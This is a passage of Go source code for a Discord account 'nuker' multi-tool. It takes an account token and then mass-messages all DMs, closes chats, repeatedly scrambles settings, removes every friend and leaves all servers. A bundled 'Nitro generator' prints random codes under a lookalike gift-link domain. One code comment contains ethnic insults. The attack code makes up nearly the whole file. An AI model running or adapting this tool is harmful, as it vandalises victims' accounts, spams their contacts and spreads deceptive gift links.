	_, _ = client.Do(req)
}

func wjson() {
	resp, err := http.Get(webhook)
	if err != nil {
		fmt.Printf("%s Error!\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("%s Error\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}
	var jsonresp map[string]interface{}
	if err := json.Unmarshal(body, &jsonresp); err != nil {
		fmt.Printf("%s Error\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}
	hotjson, err := json.MarshalIndent(jsonresp, "", "    ")
	if err != nil {
		fmt.Printf("%s Error\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
		return
	}
	if jsonresp["code"] == float64(10015) {
		fmt.Printf("%s Webhook not found!\n", color.RedString(fmt.Sprintf("[%d]", resp.StatusCode)))
	} else {
		color.Yellow(string(hotjson))

	}
}

func CheckUserToken() {
	fmt.Print(Purple + "Enter Token To Nuke ->: " + Reset)
	fmt.Scanln(&usertoken)

	if strings.EqualFold(strings.TrimSpace(usertoken), "menu") {
		ClearConsole()
		Art()
		InfoBox3DiscordCD()
		DiscordHandler()
	}

	url := "https://discord.com/api/v10/users/@me"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Printf("%s Error creating request: %s\n", color.RedString("[!]"), err)
		return
	}
	req.Header.Add("Authorization", usertoken)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var userdata struct {
			Username string `json:"username"`
			ID       string `json:"id"`
		}

		err := json.NewDecoder(resp.Body).Decode(&userdata)
		if err != nil {
			fmt.Printf("%s Error reading response!: %s\n", color.RedString("[!]"), err)
			return
		}

		acctoken = usertoken
		accusername = userdata.Username
		accuid = userdata.ID

		fmt.Printf("%s Token Loaded! Username: %s, uid: %s!\n", color.GreenString("[+]"), accusername, accuid)
		fmt.Println("Press Enter To Go Back To Account Menu!")
		fmt.Scanln()
		ClearConsole()
		Art()
		AccountBoxInfo3()
		AccountCases()
	} else {
		fmt.Printf("%s Invalid token. Please try again.\n", color.RedString("[!]"))
		fmt.Println("Press Any Key To Retry!")
		fmt.Scanln()
		ClearConsole()
		Art()
		InfoBox3DiscordCD()
		CheckUserToken()
	}
}

func AccountCases() {
	for {
		fmt.Print(Purple + "->: " + Reset)
		var input string
		fmt.Scanln(&input)

		switch input {
		case "hi":
			fmt.Println("testing command")

		case "1":
			mdm()
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "2":
			closedms()
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "3":
			AccountStroke()
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "4":
			RemoveAllRelsp()
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "nuke":
			FuckUpSettings()
			go AccountStroke()
			closedms()
			time.Sleep(5 * time.Second)
			RemoveAllRelsp()
			go ServerLeaver()
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "lang": // no longer used old way, until i found a better way
			ChangeLang()
			time.Sleep(3 * time.Second)
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "name":
			NameAccountNuke()
			time.Sleep(3 * time.Second)
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "5":
			ServerLeaver()
			time.Sleep(3 * time.Second)
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "6":
			FuckUpSettings()
			time.Sleep(3 * time.Second)
			fmt.Println("Press Enter To Go Back To Account Menu!")
			fmt.Scanln()
			ClearConsole()
			Art()
			AccountBoxInfo3()
			AccountCases()

		case "menu":
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()

		case "clear":
			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()

		case "help":
			helppls := `
		1	║ Mass DMer
		2	║ Close DMS
		3	║ Flashes settings
		4	║ Remove people
		5	║ Leaves all Servers
		6 	║ Fucks ups the settings
	
	nuke	║ All in one!
	menu	║ Goes back to menu!
	clear   ║ Clears Console!
	
			
			
			`
			PrintInCenterOfConsoleFunny(helppls)

		default:
			fmt.Printf("%s Command Not Found!\n", color.RedString("[!]"))
		}
	}
}

func AccountBoxInfo3() {
	author := "Made By awsd (TRUST TRUST)"
	infobox := fmt.Sprintf(
		"Version: %s\n%s\n--------------------Info--------------------\nAccount Name: %s \nID: %s \n--------------------------------------------",
		version, author, accusername, accuid,
	)
	PrintInCenterOfConsoleFunny(infobox)
}

func mdm() {
	var msg string
	fmt.Print(Purple + "Enter Message To Send ->: " + Reset)
	fmt.Scanln(&msg)

	dms, err := GetDMS()
	if err != nil {
		fmt.Printf("%s Error getting chats! %s\n", color.RedString("[!]"), err)
		return
	}
	color.Yellow("Sending messages.......")

	for _, chat := range dms {
		client := &http.Client{}
		req, err := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+chat.ID+"/messages",
			strings.NewReader(fmt.Sprintf(`{"content": "%s"}`, msg)))
		if err != nil {
			fmt.Printf("%s Error preparing messages. %s\n", color.RedString("[!]"), err)
			continue
		}
		req.Header.Set("Authorization", acctoken)
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("%s Error sending to %s!\n", color.RedString("[!]"), chat.Name)
			continue
		}

		if resp.StatusCode == http.StatusTooManyRequests {
			fmt.Printf("%s 429'd Timing out for 3 sec....!\n", color.RedString("[!]"))
			time.Sleep(3 * time.Second)
		} else if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			fmt.Printf("%s Message sent to %s!\n", color.GreenString("[+]"), chat.Name)
		} else {
			fmt.Printf("%s Error sending to %s!\n", color.RedString("[+]"), chat.Name)
		}
	}
	fmt.Println("All Messages Sent! Press Enter To Go Back To Account Menu!")
	fmt.Scanln()
	ClearConsole()
	Art()
	AccountCases()

}

type Chat struct {
	Name string `json:"name"`
	ID   string `json:"id"`
}

func GetDMS() ([]Chat, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/channels", nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", acctoken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("%s Error getting chats!\n", color.RedString("[!]"))
		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var chats []Chat
	err = json.Unmarshal(body, &chats)
	if err != nil {
		return nil, err
	}

	return chats, nil

}

type Chats2 struct {
	ID         string `json:"id"`
	Recipients []struct {
		Username string `json:"username"`
	} `json:"recipients"`
	Name string `json:"name"`
}

func closedms() {
	client := &http.Client{}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/channels", nil)
	if err != nil {
		fmt.Printf("%s Error: %s\n", color.RedString("[!]"), err)
		return
	}

	req.Header.Add("Authorization", acctoken)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("%s Error: %s\n", color.RedString("[!]"), err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("%s Error: %s\n", color.RedString("[!]"), err)
		return
	}

	var dms []Chats2
	if err := json.NewDecoder(resp.Body).Decode(&dms); err != nil {
		fmt.Printf("%s Error: %s\n", color.RedString("[!]"), err)
		return
	}

	var wg sync.WaitGroup
	for _, dm := range dms {
		wg.Add(1)
		go func(dm Chats2) {
			defer wg.Done()

			delreq, err := http.NewRequest("DELETE", "https://discord.com/api/v9/channels/"+dm.ID, nil)
			if err != nil {
				fmt.Printf("%s Error: %s\n", color.RedString("[!]"), err)
				return
			}

			delreq.Header.Add("Authorization", acctoken)

			delresp, err := client.Do(delreq)
			if err != nil {
				fmt.Printf("%s Error: %s\n", color.RedString("[!]"), err)
				return
			}
			defer delresp.Body.Close()

			if delresp.StatusCode == http.StatusOK || delresp.StatusCode == http.StatusNoContent {
				var name string
				if len(dm.Recipients) > 0 {
					name = dm.Recipients[0].Username
				}
				if name == "" {
					name = dm.Name
				}
				fmt.Printf("%s Closed DM with %s\n", color.GreenString("["+strconv.Itoa(delresp.StatusCode)+"]"), name)
			} else {
				var username string
				if len(dm.Recipients) > 0 {
					username = dm.Recipients[0].Username
				}
				fmt.Printf("%s Error Closing DM With: %s\n", color.RedString("[!]"), username)
			}
		}(dm)
	}

	wg.Wait()
}

type ServerACC struct {
	Name   string `json:"name"`
	Region string `json:"region"`
}

type UserSettings struct {
	Theme                 string `json:"theme"`
	Locale                string `json:"locale"`
	MessageDisplayCompact bool   `json:"message_display_compact"`
	InlineEmbedMedia      bool   `json:"inline_embed_media"`
	InlineAttachmentMedia bool   `json:"inline_attachment_media"`
	GifAutoPlay           bool   `json:"gif_auto_play"`
	RenderEmbeds          bool   `json:"render_embeds"`
	RenderReactions       bool   `json:"render_reactions"`
	AnimateEmoji          bool   `json:"animate_emoji"`
	ConvertEmoticons      bool   `json:"convert_emoticons"`
	EnableTTSCommand      bool   `json:"enable_tts_command"`
	ExplicitContentFilter string `json:"explicit_content_filter"`
	Status                string `json:"status"`
}

func RandomString(length int) string {
	randgen := rand.New(rand.NewSource(time.Now().UnixNano()))
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
	var randostring string
	for i := 0; i < length; i++ {
		randostring += string(chars[randgen.Intn(len(chars))])
	}
	return randostring
}

func FuckUpSettings() {
	headers := map[string]string{
		"Authorization": acctoken,
		"Content-Type":  "application/json",
	}

	settings := UserSettings{
		Theme:                 "light",
		Locale:                "ja",
		MessageDisplayCompact: false,
		InlineEmbedMedia:      false,
		InlineAttachmentMedia: false,
		GifAutoPlay:           false,
		RenderEmbeds:          false,
		RenderReactions:       false,
		AnimateEmoji:          false,
		ConvertEmoticons:      false,
		EnableTTSCommand:      false,
		ExplicitContentFilter: "0",
		Status:                "idle",
	}
	settingsdata, err := json.Marshal(settings)
	if err != nil {
		fmt.Printf("%s Failed to marshal settings: %s\n", color.RedString("[!]"), err)
	}
	settingsreq, err := http.NewRequest("PATCH", "https://discord.com/api/v9/users/@me/settings", bytes.NewBuffer(settingsdata))
	if err != nil {
		fmt.Printf("%s Failed to create PATCH request: %s\n", color.RedString("[!]"), err)
	}

	for key, value := range headers {
		settingsreq.Header.Set(key, value)
	}
	client := &http.Client{}
	settingsresp, err := client.Do(settingsreq)
	if err != nil {
		fmt.Printf("%s Failed to send PATCH request: %s\n", color.RedString("[!]"), err)
	}
	defer settingsresp.Body.Close()

	if settingsresp.StatusCode == http.StatusOK {
		fmt.Printf("%s Updated User Settings!: %s\n", color.GreenString("[+]"), err)
	} else {
		fmt.Printf("%s Failed to update settings: %s\n", color.RedString("[!]"), err)
	}
}

func AccountStroke() {

	themes := []string{"light", "dark"}
	// japanese, taiwanese, kim lang, fake china aka CCP, and indian scammer & greek
	locales := []string{"ja", "zh-TW", "ko", "zh-CN", "hi", "el"}

	randgen := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 400; i++ {
		settings := map[string]interface{}{
			"theme":  themes[randgen.Intn(len(themes))],
			"locale": locales[randgen.Intn(len(locales))],
		}

		jd, _ := json.Marshal(settings)

		for {
			req, err := http.NewRequest("PATCH", "https://discord.com/api/v9/users/@me/settings", bytes.NewBuffer(jd))
			if err != nil {
				return
			}
			req.Header.Set("Authorization", acctoken)
			req.Header.Set("Content-Type", "application/json")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				return
			}
			if resp.StatusCode == http.StatusTooManyRequests {
				time.Sleep(5 * time.Second)
				resp.Body.Close()
				i--
				continue
			}

			resp.Body.Close()
			break
		}
	}

}

type Relationship struct {
	ID       string `json:"id"`
	Username string `json:"user.username"`
}

func GetFriends() ([]Relationship, error) {
	url := "https://discord.com/api/v10/users/@me/relationships"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", acctoken)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, nil
	}

	var relationships []Relationship
	_ = json.NewDecoder(resp.Body).Decode(&relationships)

	return relationships, nil
}

func RemoveRel(uid string, username string, retrychan chan<- string) {
	url := fmt.Sprintf("https://discord.com/api/v10/users/@me/relationships/%s", uid)
	req, _ := http.NewRequest("DELETE", url, nil)
	req.Header.Set("Authorization", acctoken)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 204 {
		retrychan <- uid
		return
	}
	defer resp.Body.Close()

	if username != "" {
		fmt.Printf("%s Removed Relationship With %s!\n", color.GreenString("[204]"), username)
	} else {
		fmt.Printf("%s Removed Relationship With Unknown Person!\n", color.GreenString("[204]"))
	}
}

func RemoveAllRelsp() {
	for {
		relationships, err := GetFriends()
		if err != nil || len(relationships) == 0 {
			break
		}

		retrychan := make(chan string, len(relationships))
		var wg sync.WaitGroup

		for _, rel := range relationships {
			wg.Add(1)
			go func(uid, username string) {
				defer wg.Done()
				RemoveRel(uid, username, retrychan)
			}(rel.ID, rel.Username)
		}

		wg.Wait()
		close(retrychan)

		if len(retrychan) == 0 {
			break
		}

		for uid := range retrychan {
			wg.Add(1)
			go func(uid string) {
				defer wg.Done()
				RemoveRel(uid, "", nil)
			}(uid)
		}

		wg.Wait()
	}
}

func ChangeLang() {
	// not needed
	data := map[string]string{
		"settings": "YgsKBAoCaGkSAwisAg==",
	}

	jd, err := json.Marshal(data)
	if err != nil {
		fmt.Printf("%s Failed To Make Request!\n", color.RedString("[!]"))
	}

	req, err := http.NewRequest("PATCH", "https://discord.com/api/v9/users/@me/settings-proto/1", bytes.NewBuffer(jd))
	if err != nil {
		fmt.Printf("%s Failed To Make Request!\n", color.RedString("[!]"))
	}

	req.Header.Set("Authorization", acctoken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("%s Failed To Send Request!\n", color.RedString("[!]"))
	}
	defer resp.Body.Close()

}

func NameAccountNuke() { // no work :(
	data := map[string]string{
		"global_name": "Noid!",
	}

	jd, err := json.Marshal(data)
	if err != nil {
		fmt.Printf("%s Failed To Make Request!\n", color.RedString("[!]"))
	}

	req, err := http.NewRequest("PATCH", "https://discord.com/api/v9/users/@me", bytes.NewBuffer(jd))
	if err != nil {
		fmt.Printf("%s Failed To Make Request!\n", color.RedString("[!]"))
	}

	req.Header.Set("Authorization", acctoken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("%s Failed To Send Request!\n", color.RedString("[!]"))
	}
	defer resp.Body.Close()
}

type GuildServer struct {
	ID   string `json:"id"`
	Name string `json:"name"`
}

func ServerLeaver() {
	client := &http.Client{}

	for {
		req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/guilds", nil)
		if err != nil {
			fmt.Printf("%s Failed to get servers!\n", color.RedString("[!]"))
			return
		}
		req.Header.Set("Authorization", acctoken)

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("%s Failed to set client!\n", color.RedString("[!]"))
			return
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("%s Failed to read body!\n", color.RedString("[!]"))
			return
		}

		var servers []map[string]interface{}
		err = json.Unmarshal(body, &servers)
		if err != nil {
			fmt.Printf("%s Failed to unmarshal JSON!\n", color.RedString("[!]"))
			return
		}

		if len(servers) == 0 {
			break
		}

		var wg sync.WaitGroup
		serverCh := make(chan map[string]interface{}, len(servers))

		for _, server := range servers {
			serverCh <- server
		}
		close(serverCh)

		for i := 0; i < 10; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for server := range serverCh {
					HandleServers(client, server)
				}
			}()
		}

		wg.Wait()
		time.Sleep(2 * time.Second)
	}
}

func HandleServers(client *http.Client, server map[string]interface{}) {
	serverID := server["id"].(string)
	servername := server["name"].(string)
	isowner := server["owner"].(bool)

	for attempt := 0; attempt < 10; attempt++ {
		var delreq *http.Request
		var deleteresp *http.Response
		var err error

		if isowner {
			return
		} else {
			delreq, err = http.NewRequest("DELETE", "https://discord.com/api/v9/users/@me/guilds/"+serverID, nil)
		}

		if err != nil {
			break
		}
		delreq.Header.Set("Authorization", acctoken)

		deleteresp, err = client.Do(delreq)
		if err != nil {
			continue
		}
		defer deleteresp.Body.Close()

		if deleteresp.StatusCode == 204 {
			fmt.Printf("%s Left server: %s\n", color.GreenString("[204]"), servername)
			break
		} else if deleteresp.StatusCode == 429 {
			ra := deleteresp.Header.Get("Retry-After")
			rat, err := strconv.Atoi(ra)
			if err != nil {
				rat = 5
			}
			time.Sleep(time.Duration(rat) * time.Second)
			continue
		} else if deleteresp.StatusCode == 400 {
			break
		} else {
			break
		}
	}
}

func NitroGen() {
	src := rand.NewSource(time.Now().UnixNano())
	rando := rand.New(src)

	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	var countstr string
	for {
		fmt.Print("How many Nitro codes to make -> ")
		_, err := fmt.Scan(&countstr)
		if err != nil {
			var discard string
			fmt.Scanln(&discard)
			continue
		}

		count := new(big.Int)
		_, ok := count.SetString(countstr, 10)
		if !ok {
			fmt.Printf("%s Invaild Format!\n", color.RedString("[!]"))
			continue
		}

		if count.Cmp(big.NewInt(100000)) > 0 {
			fmt.Printf("%s Number needs to be 100,000 or less!\n", color.RedString("[!]"))
			continue
		}
		break
	}

	if err := keyboard.Open(); err != nil {
	}
	defer keyboard.Close()

	stop := make(chan bool)

	go func() {
		for {
			_, key, err := keyboard.GetKey()
			if err != nil {
				stop <- true
				return
			}

			if key == keyboard.KeyCtrlK {
				stop <- true
				return
			}
		}
	}()

	count := new(big.Int)
	count.SetString(countstr, 10)
	counter := new(big.Int)

	fmt.Println("Press Ctrl + K to stop and return to menu while making codes!")
	time.Sleep(3 * time.Second)

	for counter.Cmp(count) < 0 {

		code := make([]byte, 16)
		for i := 0; i < 16; i++ {
			code[i] = chars[rando.Intn(len(chars))]
		}
		fmt.Println("https://discord.gifs/" + string(code))

		select {
		case <-stop:
			fmt.Println("Press Enter To Go To Menu!")
			var discard string
			fmt.Scanln(&discard)
			fmt.Scanln(&discard)

			ClearConsole()
			Art()
			InfoBox3DiscordCD()
			DiscordHandler()
			return
		default:
		}

		counter.Add(counter, big.NewInt(1))
	}

	fmt.Println("Press Enter To Go To Menu!")

	var discard string
	fmt.Scanln(&discard)
	fmt.Scanln(&discard)

	ClearConsole()
	Art()
	InfoBox3DiscordCD()
	DiscordHandler()
}

// fuck this.
func main() {
	_, err := LoadToken("config.json")
	if err != nil {
		os.Exit(1)
	}
	ClearConsole()
	CMDName()
	Art()
	HandlerForMultiTool()
}
